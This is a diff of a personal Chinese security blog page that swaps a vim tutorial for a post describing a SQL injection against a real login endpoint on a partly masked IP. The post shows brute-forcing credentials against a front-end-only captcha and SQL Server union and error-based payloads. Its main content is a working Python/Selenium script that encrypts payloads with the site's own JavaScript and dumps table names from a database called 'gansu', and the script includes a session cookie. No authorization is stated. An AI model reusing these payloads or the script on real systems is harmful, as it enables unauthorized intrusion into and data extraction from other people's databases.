@@ -3,9 +3,9 @@
 <head>
     <meta http-equiv="content-type" content="text/html; charset=utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Linux之vim - Reber's Blog</title>
+    <title>记一次注入 - Reber's Blog</title>
     <meta name="keywords" content="渗透测试,web安全,漏洞,python,php,linux">
-    <meta name="description" content="">
+    <meta name="description" content="我的个人博客，主要用于记录自己的一些学习笔记之类的东西，其中有渗透测试、python、php等。">
     <meta name="author" content="reber">
 
     
@@ -78,12 +78,12 @@
     <div class="main">
         <div class="left">
             <div>
-                <h2>Linux之vim</h2>
+                <h2>记一次注入</h2>
                 
                 <div class="post-meta">
                     <div style="padding:5px 5px 2px 5px;">
                         <i class="fa fa-calendar fa-fw"></i>
-                        <time>2016-04-15</time>
+                        <time>2018-12-24</time>
                         &nbsp;&nbsp;&nbsp;&nbsp;
                     
 
@@ -95,7 +95,7 @@
                         
                             <i class="fa fa-folder fa-fw"></i>
                             
-                                <a class="post-taxonomy-topic" href="http://wyb0.com/topics/linux">Linux</a>
+                                <a class="post-taxonomy-topic" href="http://wyb0.com/topics/pentest">Pentest</a>
                             
                         
                         
@@ -105,7 +105,7 @@
                         
                             <i class="fa fa-tags fa-fw"></i>
                             
-                                <a class="post-taxonomy-tag" href="http://wyb0.com/tags/linux">linux</a>
+                                <a class="post-taxonomy-tag" href="http://wyb0.com/tags/injection">injection</a>
                             
                         
                         
@@ -117,108 +117,204 @@
                 
                 
 
-<h3 id="0x00-vim的安装及配置">0x00 Vim的安装及配置：</h3>
+<h3 id="0x00-验证码前端验证">0x00 验证码前端验证</h3>
 
-<ul>
-<li>安装vim</li>
-</ul>
+<p>需要测试一个网站，刚开始看到网站时感觉希望不大，因为验证码是需要拖动的，这也就意味着很大可能没办法爆破，另一方面是都用这种验证码了，安全做的能很差劲吗？果然，试了admin、123456之类的都不行
+<img src="/img/post/20181224-200518.png" alt="40" /></p>
 
-<pre><code>yum install vim
+<p>那就抓个包吧
+<img src="/img/post/20181224-200528.png" alt="70" /></p>
+
+<p>emmmmmm。 32位，md5加密？这里看着没有验证码之类的信息，把这个包发了几次发现没有出现验证码信息，而且试了试，发现有两种状态(运气比较好，有admin这个用户，我也是试的这个用户，一下子就看出返回不同了)，如下：</p>
+
+<p>用户不存在时返回
+<code>{&quot;iserror&quot;:true,&quot;message&quot;:&quot;用户名不存在！&quot;,&quot;data&quot;:null,&quot;errorfieldlist&quot;:null}</code></p>
+
+<p>用户名存在时返回
+<code>{&quot;iserror&quot;:true,&quot;message&quot;:&quot;密码不正确！&quot;,&quot;data&quot;:null,&quot;errorfieldlist&quot;:null}</code></p>
+
+<p>可以的，验证码前端验证，我觉得可以burp抓包intruder一下</p>
+
+<p>跑了top 500的用户名和top 1000的密码，除了直接试的用户名admin，其他的一个都没有跑出来 sad</p>
+
+<h3 id="0x01-存在注入">0x01 存在注入</h3>
+
+<p>嗯看来爆破是基本没有希望了，测其他的吧，嗯，这里是登陆，那肯定要看注入的，无脑加单引号，boom！
+<img src="/img/post/20181224-201033.png" alt="80" />
+<img src="/img/post/20181224-201133.png" alt="80" />
+<img src="/img/post/20181224-201233.png" alt="80" /></p>
+
+<p>可以的，and 1=1 有注入</p>
+
+<p>哎？？！！！那不对啊，咋的后台还解密md5后进行查询？？</p>
+
+<p>刚才看了数据包，用户名密码都是32位，猜想sql语句是：<code>select password from user where username=name_md5_hash</code>，然后判断用户存不存在之类的</p>
+
+<p>看返回信息的话显然不是啊，哪有后台解密md5后查询的。。。。。。</p>
+
+<p>试试post其他用户名和密码，然后看数据包
+<img src="/img/post/20181224-201534.png" alt="80" /></p>
+
+<p>显然并不是md5。。。。  这个是前端加密后发送的。。。。。看一下js，结果发现了这个
+<img src="/img/post/20181224-201945.png" alt="80" />
+<img src="/img/post/20181224-202035.png" alt="80" /></p>
+
+<p>emmmmm，想了想，应该可以注入的，看看啥系统
+<img src="/img/post/20181224-202205.png" alt="50" /></p>
+
+<p>大概率SQL Server了(因为前几天在t00ls刚看到了一个ASP.NET+MySQL，比较任性)，所以这里看一下，发现确实是SQL Server
+<img src="/img/post/20181224-202314.png" alt="80" /></p>
+
+<p>看看数据库版本，嗯，看来还是报错注入
+<img src="/img/post/20181224-202358.png" alt="80" /></p>
+
+<p>可以可以，看看有几列，然后进行union注入
+<img src="/img/post/20181224-202513.png" alt="80" />
+<img src="/img/post/20181224-202556.png" alt="80" /></p>
+
+<p>一列，这里也能大致猜出来sql语句了，估计就是：<code>select password from user where username='admin'</code></p>
+
+<p>那就看看数据库吧，不知道SQL Server中的concat怎么用，一个个来吧。。。。</p>
+
+<p>得到第一个数据库的名字：<code>union select name from master.dbo.sysdatabases where dbid=1</code>
+<img src="/img/post/20181224-202716.png" alt="80" /></p>
+
+<p>得到第二个数据库的名字：<code>union select name from master.dbo.sysdatabases where dbid=2</code>
+<img src="/img/post/20181224-202751.png" alt="80" /></p>
+
+<p>得到第5个数据库的名字：<code>union select name from master.dbo.sysdatabases where dbid=5</code>
+<img src="/img/post/20181224-202830.png" alt="80" /></p>
+
+<p>好麻烦啊，拖一下验证码，然后得到一个数据库，而且后面还有表呢。。。。。</p>
+
+<p>py一下了吧，前端有js进行加密，可以本地写文件生成加密后的payload，然后python拿到payload后进行注入</p>
+
+<h3 id="0x02-尝试写php得到加密后的payload">0x02 尝试写php得到加密后的payload</h3>
+
+<p>把加密的那个js文件SkyEnCode.js保存到本地，然后写php文件，php的话接收一个未加密的payload然后返回一个加密后的payload，大致代码：</p>
+
+<pre><code>&lt;!DOCTYPE html&gt;
+&lt;head&gt;
+    &lt;script src=jquery.min.js&gt;&lt;/script&gt;
+    &lt;script src=SkyEnCode.js&gt;&lt;/script&gt;
+    &lt;title&gt;test&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;?php
+        $name = $_GET['name'];
+        echo &quot;&lt;script&gt;
+                var name = '&quot;.$name.&quot;';
+                document.write('&gt;&gt;&gt;'+SkyEnCode.EscKeyCode(name) +'&lt;&lt;&lt;');
+            &lt;/script&gt;&quot;;
+    ?&gt;
+&lt;/body&gt;
+&lt;/html&gt;
 </code></pre>
 
-<ul>
-<li>配置文件的位置</li>
-</ul>
+<p>看了下，返回的结果是一样的，可以用(实际上并不能。。。)
+<img src="/img/post/20181224-203312.png" alt="75" /></p>
 
-<pre><code>在目录 /etc/ 下面，有个名为vimrc的 文件，
-这是系统中公共的vim配置文件，对所有用户都有效。
+<h3 id="0x03-通过python获取js加密后的payload">0x03 通过python获取js加密后的payload</h3>
+
+<p>本来是写python获取加密后的payload来着</p>
+
+<pre><code>def encode_payload(payload):
+    html = requests.get(&quot;http://127.0.0.1/tmp.php?name={}&quot;.format(payload)).text
+    m = re.findall(r'&gt;&gt;&gt;(.*?)&lt;&lt;&lt;', html)
+    return m
 </code></pre>
 
-<ul>
-<li>设置语法高亮显示</li>
-</ul>
+<p>但是获取到的是：<code>[u&quot;'+SkyEnCode.EscKeyCode(name)+'&quot;]</code>，因为js没有执行加载，所以得到的是js未执行时的页面源码</p>
 
-<pre><code>1) 打开vimrc，添加以下语句来使得语法高亮显示：
-    syntax on
-2) 如果此时语法还是没有高亮显示，那么在/etc目录下的profile文件中添加以下语句：
-    export TERM=xterm-color
+<p>记得以前看过一个东西，selenium，可以调用浏览器驱动模拟浏览器点击啥的，记得可以执行js，想到就做</p>
+
+<p>首先安装selenium：<code>sudo pip install selenium --user -U</code></p>
+
+<p>然后在<a href="http://chromedriver.storage.googleapis.com/index.html?_blank">http://chromedriver.storage.googleapis.com/index.html</a>下载Chrome的驱动，然后放到/opt下</p>
+
+<pre><code>[21:07 reber@wyb in ~]
+➜  ls /opt/chromedriver
+/opt/chromedriver
+[21:07 reber@wyb in ~]
+➜  /opt/chromedriver --version
+ChromeDriver 70.0.3538.97 (d035916fe243477005bc95fe2a5778b8f20b6ae1)
 </code></pre>
 
-<ul>
-<li>设置Windows风格的C/C++自动缩进（添加以下set语句到vimrc中）</li>
-</ul>
+<p>获取加密后payload的代码重写如下(此时已经不需要页面接收参数了，页面能引入js我们调用执行就行)：
+<img src="/img/post/20181224-204122.png" alt="80" /></p>
 
-<pre><code>1）设置Tab为4个空格
-    set tabstop=4 #设定tab长度为4
-    set softtabstop=4 #使按退格键时可以一次删除4个空格
-    set shiftwidth=4 #表示每一级缩进的长度，一般设置成跟softtabstop一样
-    set expandtab/noexpandtab #缩进用空格/制表符表示
-2）自动缩进
-    set autoindent/noautoindent #设置每行的缩进值与上一行相等/不相等(我未启用)
-3）使用 C/C++ 语言的自动缩进方式
-    set cindent
-4）在左侧显示文本的行号
-    set nu
-5）搜索设置
-    set incsearch #输入搜索内容时就显示搜索结果
-    set hlsearch #搜索时高亮显示被找到的文本
-6）如果没有下列语句，就加上吧
-    if &amp;term==&quot;xterm&quot;
-        set t_Co=8
-        set t_Sb=^[[4%dm
-        set t_Sf=^[[3%dm
-    endif
-</code></pre>
+<p>python运行后得到的userName和网页上的一样
+<img src="/img/post/20181224-204417.png" alt="70" />
+<img src="/img/post/20181224-204444.png" alt="80" /></p>
 
-<h3 id="0x01-vim编辑器的三种模式">0x01 Vim编辑器的三种模式</h3>
+<h3 id="0x04-得到数据库的表名">0x04 得到数据库的表名</h3>
 
-<ul>
-<li>命令行模式</li>
-</ul>
+<p>数据库名的话可以通过union注入改变dbid即可得到，比较简单，表名的话这里写代码获取第5个数据库gansu的表名
+<img src="/img/post/20181224-204559.png" alt="" /></p>
 
-<pre><code>$vim 文件名 #直接进入命令行模式
-Ctrl+ZZ#可保存文件
+<p>不再继续深入</p>
 
-5dd/4yy#剪切5行/复制4行
-p      #粘贴到当前行后面
-u      #一直点的话会一直撤销，直到回复到文件最初状态
+<h3 id="0x05-详细代码">0x05 详细代码</h3>
 
-gg/G   #光标移动到首行/末行
-H/M/L  #光标移动到屏幕显示的首行/中间/末行
-0/$    #光标移动到行首/行尾
-w/b    #光标跳到下一个/上一个单词
+<pre><code>#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+# code by reber &lt;1070018473@qq.com&gt;
 
-o      #在下一行插入
-Ctrl+g #显示文本的信息
+import re
+import time
+import requests
+from selenium import webdriver
+from selenium.webdriver.chrome.options import Options
 
-dt%      #删除所有内容直到遇到 %
-d0/d$或D #删除从光标到行首/行尾的字符
-3dw      #删除3个单词
+url = &quot;http://117.156.***.***/newcc/Common/AccessToken.do&quot;
+headers = {
+    &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:52.0) Gecko/20100101 Firefox/52.0&quot;,
+    &quot;Accept&quot;: &quot;application/json, text/javascript, */*; q=0.01&quot;,
+    &quot;Cookie&quot;: &quot;currentuser_JSON=eyJpZCI6MSwiZGVsc3RhdHVzIjowLCJkZXB0aWQiOjEsInVuaXRpZCI6MSwiY2hpbmFuYW1lIjoi566h55CG5ZGYIiwibG9naW5uYW1lIjoiYWRtaW4iLCJiaXJ0aCI6bnVsbCwic2V4IjoxLCJwYXNzd29yZCI6ImthdkRhVzRoanMzK3dIeC90czhvdSsxVEYzQT0iLCJtYWlsIjoiYWRtaW5Ac2t5dGVjaC5jb20iLCJpZGNhcmQiOm51bGwsIm1vYmlsZSI6bnVsbCwicGhvbmVkZXB0IjoiMDI1ODg4ODg4ODgiLCJwaG9uZWhvbWUiOiIwMjU4ODg4ODg4OCIsInBlcm1zdHJpbmciOiI3MSw2Niw4OSw0NywxMDcsMTMxLDU4LDc4LDI0NSw5Miw0MSw1NCw1NiwxLDcsMjcsMjgsNjksMzkiLCJwZXJzb25yb2xlcyI6IjgiLCJzb3J0aW5kZXgiOjAsImlzaGFzY2FyZHR5cGUiOjAsImFkZGVyIjoxLCJhZGR0aW1lIjoiMjAwNi8wMi8yMCAxMzoyOToyNiIsIm1vZGVyIjoxLCJtb2R0aW1lIjoiMjAxNy8wOC8xOSAwOToxMDo0MCJ9&quot;,
+}
 
-v+方向键      #可以从当前光标向各方向选择字符或行
-4+向下的方向键 #光标向下移动4行
+def encode_payload(payload):
+    chrome_options = Options()
+    chrome_options.add_argument('--headless') #无头模式，不打开浏览器界面
+    chrome = webdriver.Chrome(executable_path=r&quot;/opt/chromedriver&quot;,chrome_options=chrome_options)
 
-/和？#向下和向上搜索
-</code></pre>
+    try:
+        chrome.get(&quot;http://127.0.0.1/tmp.php&quot;)
+        # chrome.maximize_window() #不设置无头模式时最大化窗口
+        # time.sleep(20) #等待请求完页面
+        # print chrome.page_source #输出页面的html
+        js = &quot;var en_payload = SkyEnCode.EscKeyCode(\&quot;{}\&quot;);return en_payload;&quot;.format(payload)
+        en_payload = chrome.execute_script(js) #调用页面中加载的js代码中的加密函数
+        return en_payload
+    except Exception as e:
+        print str(e)
+    finally:
+        chrome.close()
 
-<ul>
-<li>末行模式</li>
-</ul>
+def get_tables(database):
+    payload1 = &quot;admin' and (select top 1 '~~'+name+'~~' from {}.dbo.sysobjects where xtype='U')&gt;1--&quot;.format(database)
+    payload2 = &quot;admin' and (select top 1 '~~'+name+'~~' from {}.dbo.sysobjects where xtype='U' and name not in ({}))&gt;1 --&quot;
 
-<pre><code>:wq  #推出并保存
-:wq! #强制退出并保存
-:num #跳到第n行
-:$   #移动到最后一行
-:/aaaa #向下搜aaaa这个字符串  n可以定位到下一个匹配的字符，N向上
-:?aaaa #向上搜索
-:%s/set/ddd/g #将字符串set全部替换为ddd
-</code></pre>
+    #先得到第一张表名
+    en_payload = encode_payload(payload1)
+    data = {&quot;userName&quot;: en_payload,&quot;userPwd&quot;: &quot;823d9ed14f2b86bb15234e4893c3ec54&quot;}
+    html = requests.post(url=url,data=data,headers=headers).content
+    c_table = re.search(r'~~(.*?)~~', html).group(1)
 
-<ul>
-<li>插入模式</li>
-</ul>
+    #通过for循环得到其他的表名
+    tables = list()
+    for x in xrange(5):
+        tables.append(&quot;'&quot;+c_table+&quot;'&quot;)
+        fm = &quot;,&quot;.join(str(table) for table in tables)
+        _payload = payload2.format(database,fm)
+        print _payload
+        data = {&quot;userName&quot;: encode_payload(_payload),&quot;userPwd&quot;: &quot;9ad64932f8832810867a5b9e956206ca&quot;}
+        html = requests.post(url=url,data=data,headers=headers).content
+        print html
+        c_table = re.search(r'~~(.*?)~~', html).group(1)
+    print tables
 
-<pre><code>在命令行模式直接点击i即可进入
+get_tables('gansu')
 </code></pre>
 
                 
@@ -236,19 +332,13 @@ v+方向键      #可以从当前光标向各方向选择字符或行
     <div class="pure-u-12-24" style="text-align: left;">
         
         <nav class="prev">
-            <a href="http://wyb0.com/posts/markdown-coding-syle/">
-                <i class="fa fa-chevron-left"></i>&nbsp;&nbsp;&nbsp;Markdown简单语法
+            <a href="http://wyb0.com/posts/docker-compose-build-lamp/">
+                <i class="fa fa-chevron-left"></i>&nbsp;&nbsp;&nbsp;使用docker-compose构造LAMP环境
             </a>
         </nav>
         
     </div>
     <div class="pure-u-12-24" style="text-align: right;">
-        
-        <nav class="next">
-            <a href="http://wyb0.com/posts/linux-permission-settings/">
-                Linux之权限&nbsp;&nbsp;&nbsp;<i class="fa fa-chevron-right"></i>
-            </a>
-        </nav>
         
     </div>
 </div>
